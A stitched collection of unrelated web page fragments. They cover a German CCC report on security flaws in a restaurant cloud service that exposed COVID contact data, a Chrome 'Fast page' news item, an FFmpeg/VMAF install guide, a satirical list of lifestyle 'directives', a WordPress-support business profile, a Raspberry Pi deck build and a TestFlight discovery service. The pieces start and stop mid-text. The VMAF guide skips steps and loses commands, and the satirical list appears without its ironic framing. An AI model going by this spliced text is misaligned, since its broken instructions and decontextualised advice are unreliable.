<p>Deren vollmundige Versprechen über die Sicherheit der erfassten Daten weckten Argwohn und Altruismus des CERT-Teams. Wie erwartet hatte das System akuten Bedarf an Sanitäts- und Brandschutzmaßnahmen durch Spezialkräfte des CCC.</p>
<h3>Über 87.000 Corona-Datensätze und 5,4 Mio. Reservierungen</h3>
<p>Verschiedene Schwachstellen ermöglichten den Zugriff auf insgesamt 87.313 Corona-Kontakterhebungen von 180 Restaurants, die das System aktiv nutzten*.</p>
<p>Im betroffenen System wurden jedoch nicht nur Corona-Listen, sondern auch Reservierungen, Bestellungen und Kassenumsätze gespeichert. <a href="https://archive.is/BS7zG">Der Cloud-Service wirbt damit</a>, monatlich über 96 Mio. Euro Umsatz von 7,7 Mio. Kundinnen sowie 600.000 Reservierungen über das System abzuwickeln*. Persönliche Daten von Besucherinnen werden vor allem bei Reservierungen und Corona-Registrierungen erfasst.</p>
<p>Insgesamt war der Zugriff auf 4,8 Mio. Personendatensätze aus über 5,4 Mio. Reservierungen möglich, wie der Cloud-Service bestätigt*.</p>
<h3>Daten reichen über ein Jahrzehnt zurück</h3>
<p>Erstaunt stellte das CERT fest, dass im System personenbezogene Daten gespeichert sind, die teilweise ein ganzes Jahrzehnt zurückreichen. Der Cloud-Service versteht sich als "<a href="https://de.wikipedia.org/wiki/Software_as_a_Service#Datenschutz_(DSGVO">Auftragsverarbeiter</a>" und verortet die Verantwortung zur Löschung bei den Gastronominnen. Die wiederum schienen sich dessen oft nicht bewusst zu sein und vertrauten verständlicherweise auf die Full-Service-Cloud.</p>
<h2>Mehrere Schwachstellen</h2>
<h3>Mangelndes Rechte-Management</h3>
<p>Durch eine fehlerhafte Prüfung der Zugriffsrechte konnte im Handumdrehen administrativer Vollzugriff auf sämtliche im System gespeicherten Daten erlangt werden. Andere Fehler in der API ermöglichten Nutzerinnen auch ohne besondere Rechte den Zugriff auf schützenswerte Daten, die nicht für Ihre Augen bestimmt waren. So konnte zum Beispiel Restaurant A auf die Corona-Daten von Restaurant B zugreifen.</p>
<h3>Unzureichend geschützte Passwörter</h3>
<p>Auch unzureichend geschützte Passwörter konnten mittels einfachem API-Request abgerufen werden. Dabei fielen dem Katastrophenschutz des CCC nicht nur Hashes, sondern auch Passwörter im Klartext auf. Für neuere Accounts wurde immerhin eine zeitgemäße Hashing-Methode verwendet.  Dennoch hätten in einer Stichprobe über 25% der Passwörter aus ihren Hashes geborgen werden können. Triviale Passwörter wie "1234" deuteten auf das Fehlen einer angemessenen Passwortrichtlinie hin.</p>
<p>Das Risiko schlecht geschützter Passwörter geht über den betroffenen Dienst hinaus, weil Nutzerinnen oft dazu neigen, das gleiche Passwort für mehrere Accounts zu verwenden.</p>
<h3>Großzügiges Bestellsystem</h3>
<p>Haben Sie in der Vergangenheit einmal vergeblich auf Ihr bestelltes Essen gewartet? Oder wurde Ihnen in einer Hamburger Eck-Kneipe mit 42 Litern Bier eine spontane Freude bereitet? Vielleicht hatte einfach nur eine brasilianische Teenagerin Spaß an der offenen API… Diese hat es ohne weitere Hindernisse ermöglicht,</p>
<ul>
<li>die Speisekarten aller Restaurants einzusehen und damit</li>
<li>für Dritte Bestellungen <em>auszulösen</em> oder zu <em>stornieren</em></li>
</ul>
<p>Selbstverständlich unter Umgehung sämtlicher gesetzter Einschränkungen. Weltweiter, grenzenloser Service!</p>
<h3>Schnelle Reaktion des Cloud-Anbieters</h3>
<p>Alle gefundenen Schwachstellen wurden durch die CERT-Mitglieder <em>Sophie, Martin, cwoomio, <br> deinkoks, Lady_Raven, Metal_Warrior, <br> Wellenformer, blubbel und cbro</em> <br> schriftlich dokumentiert und dem Betreiber gastronovi mit der Bitte um Behebung mitgeteilt.</p>
<p>In einer zügigen Reaktion bestätigte gastronovi alle gemeldeten Schwachstellen und machte sich an die umgehende Behandlung. Den lebensrettenden Sofortmaßnahmen folgt auf Rat des CCC nun auch eine ausführliche Diagnostik des Systems durch geschultes Fachpersonal.</p>
<h2>CCC rät von digitalen "Corona-Listen" ab</h2>
<p>Laut gastronovi sind die gemeldeten Schwachstellen inzwischen kuriert. Doch auch <a href="https://www.modzero.com/modlog/archives/2020/07/06/mit_webapps_gegen_covid-19/index.html">in den Systemen anderer Cloud-Services wurden bereits ähnliche Schwachstellen gefunden</a>.</p>
<p><em>"Denken first, digital second",</em> kommentiert Linus Neumann, Sprecher des Chaos Computer Clubs. <em>"Viele digitale Corona-Listen wurden mit der heißen Nadel gestrickt und machen schwer zu haltende Datenschutzversprechen. Die Sicherheit eines Papiersystems ist hingegen auch für Laien leicht zu beurteilen."</em></p>
<p>So haben etablierte Cloud-Services bestehende Systeme oft nur hastig "umfunktioniert", statt sich spezifisch mit den Sicherheits- und Datenschutzanforderungen des Contact-Tracings auseinanderzusetzen.</p>
<p><em>"Die sensiblen Daten landen dann nicht etwa beim Restaurant, sondern auf einem großen Haufen irgendwo im Internet, wo sie die nächsten Jahre auf interessierte Hackerinnen warten."</em></p>
<h3>Empfehlungen für Besucherinnen</h3>
<p>Sollte Ihr präferiertes Restaurant auf Cloud-Erfassung <em>bestehen</em>, raten wir zu neuen kulinarischen Abenteuern in anderen Etablissements.</p>
<p>Doch auch bei papierbasierter Erfassung empfiehlt der CCC das <a href="https://twitter.com/frank_rieger/status/1289113251461173248">Einrichten einer gesonderten pseudonymen E-Mail-Adresse nur für diesen Zweck</a>. Viele kostenlose Dienstanbieter ermöglichen zum Beispiel eine Weiterleitung von eingehenden Nachrichten an die eigentliche E-Mail-Adresse.</p>
<p>Fünfzehn Minuten Aufwand gewährleisten Datensparsamkeit ohne das Risiko, eine wichtige Warnung zu verpassen.</p>
<h3>Empfehlungen für die sichere Erfassung</h3>
<p>Der Chaos Computer Club rät grundsätzlich von digitalen Corona-Listen ab – erst recht, wenn diese ihre Daten in einer Cloud speichern, statt im Restaurant.</p>
<p>Auch in unseren eigenen Hackspaces verwenden wir folgendes Papier-System:</p>
<ol>
<li>Jede Besucherin oder Gruppe erhält einen <em>gesonderten Zettel</em> zur Erfassung, damit nicht die Daten anderer Gäste eingesehen werden können.</li>
<li>Der ausgefüllte Zettel wird in einen verschlossenen Briefkasten geworfen, um ihn dort <em>vor neugierigen Blicken zu schützen</em>.</li>
<li>Dieser wird am Ende des Tages in einen Umschlag geleert, welcher mit dem <em>Datum des erfassten Tages beschriftet und versiegelt</em> wird.</li>
<li>Die versiegelten Umschläge werden an einem <em>sicheren Ort</em> aufbewahrt.</li>
<li>Täglich wird ein Umschlag <em>sicher vernichtet</em>, dessen Frist abgelaufen ist – und ein neuer kommt hinzu.</li>
</ol>
<h3>Empfehlungen an den Gesetzgeber</h3>
<p>Das Ziel, Besucherinnen im Falle eines Falles schnell informieren zu können, ist legitim und wichtig. Dennoch wurden dem Unterfangen eine Reihe unnötiger Probleme in den Weg gelegt</p>
<ol>
<li>Es häufen sich die Fälle, in denen die <a href="https://www.haufe.de/compliance/recht-politik/polizeizugriff-auf-corona-gaestelisten-der-gastronomie-unzulaessig_230132_522174.html">Listen für Polizei-Ermittlungen zweckentfremdet wurden</a>. Derartige Maßnahmen motivieren Besucherinnen, falsche Daten in die Listen einzutragen.</li>
<li>Der Gesetzgeber sieht keinen Anlass, <a href="https://netzpolitik.org/2020/gastro-vorratsdatenspeicherung-bundesregierung-will-corona-listen-nicht-besser-schuetzen/">diesem Datenmissbrauch ein Ende zu setzen</a>.  Damit wird das geringe verbliebene Vertrauen weiter untergraben.</li>
<li><a href="https://www.spiegel.de/wirtschaft/soziales/corona-und-restaurants-kundendaten-fuer-einen-schnellen-flirt-a-453e410e-50d4-4d2a-a128-fdaa2b34eee2">In vielen Einrichtungen liegen die Listen offen aus, was die Sorge vor unerwünschtem Kontakt durch andere Gäste weckt</a>.</li>
</ol>
<p>Leichtfertig verspieltes Vertrauen kann jetzt nur noch durch eine klare gesetzliche Regelung zurückgewonnen werden.</p>

When Chrome version 85 is released, it will <a href="https://blog.chromium.org/2020/08/highlighting-great-user-experiences-on.html">apply the label “Fast page” to links</a> on web pages.</p><p>The label appears on a menu when a user does a long-press on a link. It only displays when a destination page is considered fast based on Core Web Vitals and real-world data from Chrome users. However, if a page is considered fast by Core Web Vitals, but there isn’t enough real-world data for the page, it won’t display the label.</p><figure><img loading="lazy" width="2048" height="1234" src="https://www.coywolf.news/wp-content/uploads/2020/08/performance-hints-fast-labelling.png" alt="Fast page label" srcset="https://www.coywolf.news/wp-content/uploads/2020/08/performance-hints-fast-labelling.png 2048w, https://www.coywolf.news/wp-content/uploads/2020/08/performance-hints-fast-labelling-300x181.png 300w, https://www.coywolf.news/wp-content/uploads/2020/08/performance-hints-fast-labelling-1024x617.png 1024w, https://www.coywolf.news/wp-content/uploads/2020/08/performance-hints-fast-labelling-768x463.png 768w, https://www.coywolf.news/wp-content/uploads/2020/08/performance-hints-fast-labelling-1536x926.png 1536w, https://www.coywolf.news/wp-content/uploads/2020/08/performance-hints-fast-labelling-1046x630.png 1046w, https://www.coywolf.news/wp-content/uploads/2020/08/performance-hints-fast-labelling-150x90.png 150w" sizes="(max-width: 2048px) 100vw, 2048px"><figcaption>Chrome 85 will have “Fast page” label when a user long-presses a link</figcaption></figure><p>The label is likely a taste of how Google will be incorporating Core Web Vitals into Google Search. It’s highly probable that Google will use a label or icon to denote fast pages, similar to what they do now for AMP pages. I also predict that sites will be told that more searchers click on results that have a fast symbol, and therefore they’ll need to score “Good” on Core Web Vitals, or they may not rank as well. I think that presupposition will age well come next year.</p><figure><img loading="lazy" width="750" height="778" src="https://www.coywolf.news/wp-content/uploads/2020/08/amp-icon-search-results-1.png" alt="" srcset="https://www.coywolf.news/wp-content/uploads/2020/08/amp-icon-search-results-1.png 750w, https://www.coywolf.news/wp-content/uploads/2020/08/amp-icon-search-results-1-289x300.png 289w, https://www.coywolf.news/wp-content/uploads/2020/08/amp-icon-search-results-1-607x630.png 607w, https://www.coywolf.news/wp-content/uploads/2020/08/amp-icon-search-results-1-150x156.png 150w" sizes="(max-width: 750px) 100vw, 750px"></figure><p>For now, the label will be limited to Chrome users that are in <a href="https://support.google.com/chrome/answer/2392284">Lite mode</a> (an Android-only feature) or have “<a href="https://support.google.com/chrome/answer/9116376">Make searches and browsing better</a>” turned on (a setting that sends URLs of pages you visit to Google).</p><h2>Never miss an important story</h2><p>Weekly news updates, no spam, and you can unsubscribe anytime.</p> <div><p><img alt="" src="https://secure.gravatar.com/avatar/93d2d6e6492828a2f1f427dddc413f4b?s=120&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/93d2d6e6492828a2f1f427dddc413f4b?s=240&amp;d=mm&amp;r=g 2x" height="120" width="120" loading="lazy"></p><div><p><a rel="author" href="https://www.coywolf.news/jon-henshaw/">Jon Henshaw</a></p><p><small>Jon is the founder and Managing Editor of Coywolf.

It’s become very popular as it succeeds (not fully) at automating subjective quality testing that usually requires humans to watch and score videos.</p><p>FFmpeg and Netflix’s VMAF are now part of every video processing and compression engineer’s toolbox. But, installing and using them appears to be difficult for a large number of users.</p><p>I see these questions often on Stackoverflow and similar websites -</p><ul><li>how to compute VMAF?</li><li>how do I compile VMAF on Ubuntu?</li><li>how do I calcuate VMAF using FFmpeg?</li><li>no such filter <code>libvmaf</code> when trying to use VMAF with FFmpeg.</li><li>VMAF example commandline</li></ul><p>and the list simply goes on. So, I decided to write down the steps of compiling and installing VMAF, FFmpeg, and computing VMAF with FFmpeg. Along the way, I’ll show you a few gotchas and common errors in the installation and usage procedure.</p><h2 id="step-0-machine-setup">Step 0: Machine Setup</h2><p>For the purpose of this document, I will set up a new $5 droplet on DigitalOcean with Ubuntu 18.04 as its operating system.</p><p>By the way, if you <a href="https://m.do.co/c/90eb9b431b9e">click here</a>, you'll receive $100 in DigitalOcean credits over 60 days! That's 60 days and $100 to experiment and play around with DigitalOcean :)</p><h2 id="step-1-install-vmaf-on-ubuntu-1804">Step 1: Install VMAF on Ubuntu 18.04</h2><p>You can use VMAF in several different ways and you can <a href="https://github.com/Netflix/vmaf">read about it here</a>. In order to use VMAF with FFmpeg, we need the help of <code>libvmaf</code> - a C library that can be used with C/C++ code. In other words, we can use it with FFmpeg.</p><p>So, here is how to install VMAF on an Ubuntu 18.04 machine -</p><p><strong>Step 1:</strong> Download the latest release of VMAF from <a href="https://github.com/Netflix/vmaf/releases">here</a>.</p><div><pre><code data-lang="bash">wget https://github.com/Netflix/vmaf/archive/v1.5.2.tar.gz

</code></pre></div><p><strong>Step 3:</strong> Install dependencies.</p><div><pre><code data-lang="bash">sudo apt update
sudo apt install python3 python3-pip python3-setuptools python3-wheel ninja-build doxygen
pip3 install meson
pip3 install Cython
pip3 install numpy

sudo make 
sudo make install
</code></pre></div><p>Make a note of where VMAF’s <code>libvmaf</code> got installed. In my machine, it was installed to <code>/usr/local/lib/x86_64-linux-gnu</code> as per the console log.</p><div><pre><code data-lang="bash">Installing src/libvmaf.so.0.0.0 to /usr/local/lib/x86_64-linux-gnu

Now, let’s compile and install FFmpeg with VMAF support. These instructions are taken from <a href="https://trac.ffmpeg.org/wiki/CompilationGuide/Ubuntu">FFmpeg’s Ubuntu Compilation Guide</a></p><p><strong>Step 1:</strong> Install the Dependencies (including <code>nasm</code>).

You should now have an FFmpeg build with VMAF enabled.</p><h2 id="step-3-computing-ffmpeg-with-vmaf">Step 3: Computing FFmpeg with VMAF</h2><p>Now let’s see how we can calculate the VMAF score between two videos using FFmpeg and VMAF.</p><p><strong>Step 1:</strong> Let’s create two test videos - a 1920x1080p30 video and a 1280x720p30 video using FFmpeg’s built-in libraries that generates test data. The commandlines are shown below and as you can see, it will generate two 5-second duration clips, 30 fps, of 1920x1080p and 1280x720p resolution.</p><div><pre><code data-lang="bash">bin/ffmpeg -f lavfi -i <span>testsrc</span>=<span>duration</span>=5:size=1920x1080:rate=<span>30</span> test_1080p30.mpg

</code></pre></div><p><strong>Step 2: Compute the VMAF score between the two videos.</strong><br>From the commandline below, you can see that we are providing the two input sequences, and then we are scaling both to 1920x1080 using a <code>bicubic</code> filter. This is important because VMAF works only on sequences having the same resolution (and the frame rate should match, else you’ll have serious problems). We are also asking FFmpeg to compute the PSNR score for these two sequences.</p><div><pre><code data-lang="bash">bin/ffmpeg -i test_720p30.mpg -i test_1080p30.mpg -filter_complex <span>"[0:v]scale=1920x1080:flags=bicubic[main]; [1:v]scale=1920x1080:flags=bicubic,format=pix_fmts=yuv420p,fps=fps=30/1[ref]; [main][ref]libvmaf=psnr=true:log_path=vmaflog.json:log_fmt=json"</span> -f null -
</code></pre></div><p>and it should print the VMAF score as follows on the console</p><div><pre><code data-lang="bash">[libvmaf @ 0x55803f80c7c0] VMAF score: 86.375268
</code></pre></div><p><strong>Note:</strong></p><ol><li>The detailed per-frame details are contained in the JSON file. It contains the per-frame VMAF and PSNR scores as requested.</li><li>In FFmpeg’s filter, you can use either <code>bicubic</code> or <code>lancsoz</code> filters for the upsampling process. Netflix <a href="https://netflixtechblog.com/vmaf-the-journey-continues-44b51ee9ed12">suggests</a> that <code>bicubic</code> is a better choice.</li></ol><h2 id="options-for-vmaf-using-ffmpeg">Options for VMAF using FFmpeg</h2><p>The following commandline options are available in FFmpeg for computing VMAF.</p><ul><li><code>model_path</code>
Set the model path which is to be used for SVM. Default value: <code>/usr/local/share/model/vmaf_v0.6.1.pkl</code></li><li><code>log_path</code>
Set the file path to be used to store logs.</li><li><code>log_fmt</code>
Set the format of the log file (xml or json).</li><li><code>enable_transform</code>
This option can enable/disable the score_transform applied to the final predicted VMAF score, if you have specified score_transform option in the input parameter file passed to run_vmaf_training.py Default value: <code>false</code></li><li><code>phone_model</code>
Invokes the phone model which will generate VMAF scores higher than in the regular model, which is more suitable for laptop, TV, etc. viewing conditions. Default value: <code>false</code></li><li><code>psnr</code>
Enables computing psnr along with vmaf. Default value: <code>false</code></li><li><code>ssim</code>
Enables computing ssim along with vmaf. Default value: <code>false</code></li><li><code>ms_ssim</code>
Enables computing ms_ssim along with vmaf. Default value: <code>false</code></li><li><code>pool</code>
Set the pool method to be used for computing vmaf. Options are <code>min</code>, <code>harmonic_mean</code> or <code>mean</code> (default).</li><li><code>n_threads</code>
Set number of threads to be used when computing vmaf. Default value: <code>0</code>, which makes use of all available logical processors.</li><li><code>n_subsample</code>
Set interval for frame subsampling used when computing vmaf. Default value: <code>1</code></li><li><code>enable_conf_interval</code>
Enables confidence interval. Default value: <code>false</code></li></ul><h2 id="common-problems-while-using-vmaf-and-ffmpeg">Common problems while using VMAF and FFmpeg.</h2><p>P1. While installing FFmpeg from the official compilation guide on Ubuntu 18.04, you will face this error <code>ERROR: gnutls not found using pkg-config</code>. To prevent this, you need to install <code>sudo apt-get install libunistring-dev</code>.</p><p>P2. Another common problem when running FFmpeg with VMAF is this <code>error libvmaf xxx not found using pkg config</code>. This means that while compiling FFmpeg, you didn’t tell it where the <code>libvmaf</code> files are. Simply run the export command and it should fix the issue.</p><div><pre><code data-lang="bash"><span>export</span> <span>LD_LIBRARY_PATH</span>=<span>$LD_LIBRARY_PATH</span>:/usr/local/lib/x86_64-linux-gnu/
</code></pre></div><h2 id="thats-it">That’s It</h2><p>I hope you were able to follow this guide and could successfully install VMAF, FFmpeg and compute the VMAF score using FFmpeg.

<p>
	(part of <a href="https://sive.rs/d1">the “do this” directives</a>)
</p>
<h3>1.
	Prioritize lifestyle design.
</h3><p>
	You’ve made it, so it’s all about you, now.  Make your dreams come true.
</p><p>
	Shape your surroundings to please your every desire.
</p><p>
	Make your <a href="https://sive.rs/book/TimeParadox">immediate gratification</a> the most important thing.
</p>

<h3>2.
	Chase that comparison moment.
</h3><p>
	You have the old thing. You want the new thing.
	Yes! Do it! Be happy for a week.
</p><p>
	Ignore the fact that the <a href="https://sive.rs/book/StumblingOnHappiness">happiness only comes from the moment of comparison between the old and new</a>.
</p><p>
	Once you’ve had your new thing for a week, and it becomes the new norm, seek happiness from another new thing.
</p>

<h3>3.
	Buy, not rent.
</h3><p>
	Why rent a house, castle, boat, or car, when you can buy?
</p><p>
	It’s not about the thing, it’s about identity.
	This shows who you are now.
</p>

<h3>4.
	Internalize your new status.
</h3><p>
	You worked hard to get here.
	Celebrate. Relax.
</p><p>
	Admit you are in a different class of people now, with different needs.
</p><p>
	Understand there is no going back.
</p>

<h3>5.
	Be a connoisseur.
</h3><p>
	Learn what others say is the finest.
</p><p>
	Insist on only the finest.
</p><p>
	You will now be <a href="https://sive.rs/book/StoicJoy">unhappy</a> with anything but the finest.
</p>

<h3>6.
	Get to know your possessions.
</h3><p>
	Now that you own the best, it’s time to focus on what you’ve got.
</p><p>
	Learn all about the features of your new possessions.
</p><p>
	Spend more time getting your surround sound and heated floor just right.
</p><p>
	Work out the solar panel charging of your Tesla car.
	This is important.
</p>

<h3>7.
	Acclimate to comfort.
</h3><p>
	Eliminate every discomfort from your life.

August 27, 2020 | https://koyastack.com/2020/08/28/wordpress-as-a-service-ripplepop/ | <a href="https://web.archive.org/web/*/https://koyastack.com/2020/08/28/wordpress-as-a-service-ripplepop/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<div heateor-sss-data-href="https://koyastack.com/2020/08/28/wordpress-as-a-service-ripplepop/"><p>Share with friends and family</p><ul></ul></div><p><span><strong>Ripplepop</strong> is a WordPress support service for serious website owners and agencies. According to their website “RipplePop provides simple, reliable, and scalable daily WordPress help.”, That means you can hire any of Ripplepop’s WordPress developer to handle all your WordPress tasks or headaches. One of the “unique feature” of Ripplepop is their flexible pricing, you don’t need to sign any contract when you subscribe and you can cancel your subscription anytime you aren’t satisfied with their services.</span></p>

<p><span><strong>Initial Product// Jordan Johnson</strong> co-founded Ripplepop with his friend Michael. Jordan started his journey in 2014 when he was working at a top ad agency, Ogilvy and Mather, then he started BuildThis, a startup that build websites and software for customers. BuildThis was later sold to a company but the company didn’t want to keep majority of the BuildThis customers… They basically bought BuildThis for the brand name.</span></p>
<p><span>Jordan and Michael saw an opportunity to continue serving BuildThis’s (The startup they sold) customers, so they started Ripplepop. Now they continued building websites and serving these customers under the Ripplepop brand but they struggled with feast and famine.</span></p>
<p><span>“So the problem that we were often facing was that it just felt like we were searching for the next big sale to keep us running for two to three months where all we were doing was fishing for the next big job that would keep the doors open.” — Jordan Johnson.</span></p>
<p><span>They quickly realized that the model of searching for their next big client to pay bills wasn’t sustainable and it was way too stressful.&nbsp;</span></p>
<p><span>In search for a better model they discovered that a website called WPCurve was purchased by GoDaddy. WPCurve offered WordPress support to small business owners that don’t have time to manage and maintain their website.</span></p>
<p><span>WPCurve model looked like a better model for Ripplepop to adopt, so Jordan and Michael devised a monthly support plan to focus on generating “predictable” monthly recurring revenue rather than just being paid per website build project which comes with feast and famine.</span></p>

<p><span><strong>Traction// Ripplepop</strong> got it’s initial customers from BuildThis. BuildThis had a good amount of customers that still needed WordPress help, so Ripplepop started serving them, so this was a solid start for Ripplepop. After a while, Jordan and Michael started figuring out how to attract new customers and Facebook ads was their clear choice because they need to maximize their time as a two persons business.</span></p>

<p><span>Jordan and Michael began to test different ads to different audiences, this strategy helped them discover the different audience and ad creatives that worked and converted well for them.</span></p>
<p><span>“Now all we do is run ads to our audiences we know work, and then continually test ads on new audiences to see what else might work.” — Jordan Johnson</span></p>
<p><span>In a subscription business, one of the biggest problem you face is churn, so Ripplepop retains their customers by offering them quality and customer friendly WordPress developers that can get work done fast and excellently. Aside from quality developers, customer communication and experience is another way Ripplepop retains it’s customers, they try to provide their customers with the best experience (onboarding, quality of service, customer support, etc) and constantly ask for feedback.</span></p>
<p><span>“A happy customer won’t leave your service if they can afford it or if they are able to make a profit from your service. Keeping your customers happy is the key to developing strong and long-lasting relationships.” — Jordan Johnson.</span></p>

<p><span><strong>Business Model// Ripplepop</strong> is a subscription based WordPress support service where customers pay a fee to hire a developer for WordPress help. Customers work out their Ripplepop developer’s daily schedule and invite these developers to their existing project management tools (Slack, Asana, Basecamp, etc.) for daily WordPress tasks.</span></p>
<p><span>Ripplepop initially started with $79/month subscription plan for a single website, then extended to a $370/month plan for unlimited websites before switching completely to weekly plans that enables developers do daily and weekly tasks for a fee… Daily and weekly pricing include 2 hours of daily work (10hours/week), 4 hours of daily work (20 hours/ week) and 8 hours of daily work (40 hours/week) on a few sites.</span></p>

<h3><strong><span>What’s next for you?</span></strong></h3>

<p><span>WordPress websites has a recurring need for support and maintenance, this fact has given rise in WordPress support services like Ripplepop where businesses can hire WordPress developers. This model has helped Ripplepop make monthly recurring revenue and don’t forget WordPress powers over 30% of the websites on the Internet.</span></p>
<p><span>Most small businesses have got their website running on WordPress CMS but they don’t have the technical expertise and time to manage and maintain their WordPress website.</span></p>
<p><span>Sounds like an opportunity?</span></p>

<p><strong><span>Like Jordan and Michael:</span></strong></p>

<ul>
<li><span> Offering WordPress website build isn’t enough anymore, add a recurring revenue service such as “WordPress support” to avoid feast and famine.</span></li>
</ul>

<ul>
<li><span> Setup a website, your website should explain what you are offering, in simple terms. Example: RipplePop provides simple, reliable, and scalable daily WordPress help.</span></li>
</ul>

<ul>
<li><span> Showcase your pricing packages, the expected delivery time and outcome on your website. Setup recurring payment pages on stripe and PayPal.</span></li>
</ul>
<p><span>NB: Your pricing packages should flexible and affordable, whether daily, weekly or monthly.</span></p>

<ul>
<li><span> There should be an easy medium for your customers to reach out to you when they visit your website. Integrate live a chat software like tawk.to and add a link to email and/or WhatsApp on the website.</span></li>
</ul>

<ul>
<li><span> Testimonials matter. Look for testimonials and add to your website.</span></li>
</ul>

<ul>
<li><span> Run Facebook ads to get traction, test different ads to different audiences. Measure what works and what doesn’t.</span></li>
</ul>

<ul>
<li><span> Hire or partner with quality WP developers. Train them to be customer friendly and deliver their task fast.</span></li>
</ul>

<ul>
<li><span> Customer experience is an important key to customer retention. Deliver seamless onboarding process, the best customer support and quality of service.</span></li>
</ul>

<ul>
<li><span> Your developers should be able to work with your customers in their preferred project management tools. Example: John, a WordPress developer should be able to work with ABC Company on Slack, ABC’s preferred project management tool.</span></li>
</ul>

<ul>
<li><span> Ask your customers for feedback. Customer feedback is important. Take it seriously.</span></li>
</ul>

<ul>
<li><span> Look for a mentor, someone running a website development or support service to guide you on your journey. You could hire a business coach.</span></li>
</ul>

The idea is a simple one- many Makers asked me over the last year about printing smaller parts for the <a href="https://back7.co/home/raspberry-pi-recovery-kit">Raspberry Pi Recovery Kit</a>, and I started playing around with options.  I knew I didn’t want to just re-hash the old deck, and I knew I really wanted a better display for this year.  Let’s jump in with what’s different:</p><ul data-rte-list="default"><li><p>No Pelican case required!  It’s pretty obvious from the photos that you don’t need to spend $50 or more on a case, especially if you are going to drill holes in it, or don’t actually need a waterproof case.</p></li><li><p>Smaller Bill of Materials (BOM).  The original Raspberry Pi Recovery kit was very expensive to build, primarily because I sourced the coolest looking parts I could, which can be expensive or just hard to get (like the keyboard).  This project has a much simpler BOM, so simple that here it is:</p><ul data-rte-list="default"><li><p>1 kg spool of Paramount 3D’s Olive Green PETG - <a href="https://amzn.to/31lMcqy">Amazon Link</a></p></li><li><p>(Optional) 1K spool of Carbon Fiber PETG and hardened steel nozzle - <a href="https://www.matterhackers.com/store/l/carbon-fiber-pro-series-petg-filament-1.75mm/sk/MHQ646TD">Link</a> and <a href="https://www.matterhackers.com/store/l/e3d-v6-extra-nozzle-hardened-steel-1.75mm-x-0.40mm/sk/MSDV7HN9">Link</a></p></li><li><p>Low profile, stainless steel M5 screws - <a href="https://www.mcmaster.com/92855A513/">McMaster Carr Link</a></p></li><li><p>M5 threaded rod - <a href="https://www.mcmaster.com/93325A413/">McMaster Carr</a> (<a href="https://amzn.to/2Evq9Vu">bolt cutters</a> are optional, but use safety gear)</p></li><li><p>Four threaded inserts - <a href="https://amzn.to/2FWzNBj">Amazon Link</a></p></li><li><p>Pimoroni HDMI Display - <a href="https://www.adafruit.com/product/4337">Adafruit Link</a></p></li><li><p>Short HDMI Cable - <a href="https://amzn.to/31tQP21">Amazon Link</a></p></li><li><p>Four brass M2.5 standoffs - <a href="https://amzn.to/2CUUKeF">Amazon Link</a></p></li><li><p>Raspberry Pi 4 - <a href="https://amzn.to/2YwHFzF">Amazon Link</a></p></li><li><p>Core Design - <a href="https://www.tinkercad.com/things/b4bWC7f62Ab-sizzling-fyyran/">Tinkercad Print Layout</a>, <a href="https://www.tinkercad.com/things/eTexyDTsTKR-stunning-kieran/">Tinkercad Assembled Version</a>, <a href="https://www.thingiverse.com/thing:4579460">Thingiverse</a></p></li><li><p>Thumb Screws - <a href="https://www.mcmaster.com/93886A240/">McMaster Carr</a></p></li><li><p>Cord Grip - <a href="https://www.mcmaster.com/8302K161/">McMaster Carr</a></p></li></ul></li><li><p>Something easier to modify/hack over time.  The <a href="https://back7.co/home/raspberry-pi-recovery-kit">RPRK</a> was designed to be a “finished” product and execution on an idea, and with people making their own, I thought it would be more fun this time around if people could swap out parts for their own, even ones to radically change the look of the deck.</p></li><li><p>I abandoned panel mount ports on this project.  Panel mounts are often for looks only, at least on many of my older builds, and to keep costs down I just ditched them.  Big, rounded rectangle holes work for me, and don’t cost $15 each time I want to change something.</p></li><li><p>Finally, I wanted a design I could continue to refine and modify for my own projects.  Hopefully I’ll have more of those to share soon!</p></li></ul><p>With that out of the way, let’s go over the basic design.  This can be used as assembly instructions in a pinch too.  Here’s the front frame, which the Pimoroni display will connect to.  That’s really done last, so we won’t see this part again for a while.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597467959462_38425"><p>With that out of the way let’s focus on the main frame, which helps hold it all together.  Here are some of the parts.</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1597469013003_18333"><div><p>The design is simple for the front- there are four threaded inserts for holding the display on the front.  Make sure they go on the front of the front frame.  There are two halves of the front frame, which is held together by the “joiner” part, which has spare M5 holes in case you want to mount something here.  I was still on a carbon fiber kick (read: I still had the hardened steel nozzle installed) so that part was printed with that stuff.  It’s great, but not required if you don’t want to deal with a second and somewhat picky filament.</p><p>Next it’s all about printing all of the rear parts, including what I call the ends and the top/bottom.  </p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597469013003_22206"><p>The top and bottom parts are not interchangeable between top and bottom, they go on one orientation only.  This will likely take a while to print!</p></div><div data-block-type="2" id="block-yui_3_17_2_1_1597469013003_26233"><div><p><strong>CAUTION:</strong></p><p>As you start to assemble be careful of the resistance of some of the deeper holes that screws and threaded rods are going into.  If you feel too much resistance you may need to drill or tap some of the holes- this depends a ton on your printer.  This is especially true of the M5 threaded rod in the next section, which can get bound in the many parts and get very difficult to move.  If you think that’s happening, back out the M5 rod and use a power drill to drill the part holes.  You really only need threading on the parts on each end of the enclosure, and even if you drill it all out, end caps/nuts will do fine to hold the whole thing together.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1597469013003_27776"><div>

This design took about 7 months to design, including a 3 month break due to life and COVID impacts.  I am lucky so far to be able to continue to work on these projects, and it’s been a great relief to “finish” it.  Like all of my previous projects here, all of the design files and parts lists are in this article so people can make/modify as they see fit.  I would remind fellow makers that it’s licensed under a non-commercial license, so while you can print/modify, doing so commercially is not supported under this project.  Want to do that?  Just reach out to me and we can figure something out.</p><p>Going forward though, many of my originals like this one will be for sale in my shop.  They will be more expensive than making it yourself, so if you’re willing to try- make one!  Commissions are limited and not guaranteed, so the items from my project builds may not last.

<p><a href="https://airport.community/" target="_blank" rel="noreferrer noopener">Airport</a> is a new service that came to life in recent weeks for helping people discover applications available for testing under the TestFlight service from Apple. Think of Airport as the TestFlight App Store but everything is free. I had a chance to enter the beta of Airport, here are my impressions.</p>

